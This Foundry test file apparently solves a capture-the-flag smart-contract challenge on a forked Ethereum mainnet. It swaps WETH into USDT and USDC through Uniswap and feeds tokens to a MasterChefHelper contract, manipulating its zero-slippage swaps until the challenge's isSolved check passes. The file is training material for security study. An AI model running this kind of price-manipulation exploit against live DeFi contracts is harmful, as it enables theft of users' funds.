// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Setup.sol";

interface USDC is ERC20Like {
    function deposit() external payable;
}

interface USDT is ERC20Like {
    function deposit() external payable;
}

contract SetupTest is Test {
    uint256 mainnetFork;
    Setup public setupContract;
    UniswapV2RouterLike router;

    function setUp() public {
        mainnetFork = vm.createFork(vm.envString("MAINNET_RPC_URL"));
        vm.selectFork(mainnetFork);
        setupContract = new Setup{value: 10 ether}();
    }

    function test_isSolved() public {
        _slove();
        assertTrue(setupContract.isSolved());
    }

    function _slove() internal {
        MasterChefHelper mcHelper = setupContract.mcHelper();
        router = mcHelper.router();
        WETH9 weth = setupContract.weth();
        USDC usdc = USDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        USDT usdt = USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        weth.deposit{value: 20 ether}();

        // Swap 10.1 WETH to USDT and send to mcHelper
        ERC20Like(address(weth)).approve(address(router), 10_100_000_000 gwei);
        _swap(address(weth), address(usdt), 10_100_000_000 gwei);
        usdt.transfer(address(mcHelper), usdt.balanceOf(address(this)));

        // Swap 1 WETH to USDC
        ERC20Like(address(weth)).approve(address(router), 1 ether);
        _swap(address(weth), address(usdc), 1 ether);

        // USDC -> SLP
        console.log(
            "Before swap, USDT balance: %d, WETH balance: %d",
            usdt.balanceOf(address(mcHelper)),
            weth.balanceOf(address(mcHelper))
        );
        console.logUint(usdt.balanceOf(address(mcHelper)));
        console.logUint(weth.balanceOf(address(mcHelper)));
        ERC20Like(address(usdc)).approve(address(mcHelper), type(uint256).max);
        mcHelper.swapTokenForPoolToken(
            0,
            address(usdc),
            usdc.balanceOf(address(this)),
            0
        );
        console.log(
            "After swap, USDT balance: %d, WETH balance: %d",
            usdt.balanceOf(address(mcHelper)),
            weth.balanceOf(address(mcHelper))
        );
        // There will be a small amount of USDT left, but let's ignore it for now
    }

    function _swap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) internal {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        router.swapExactTokensForTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
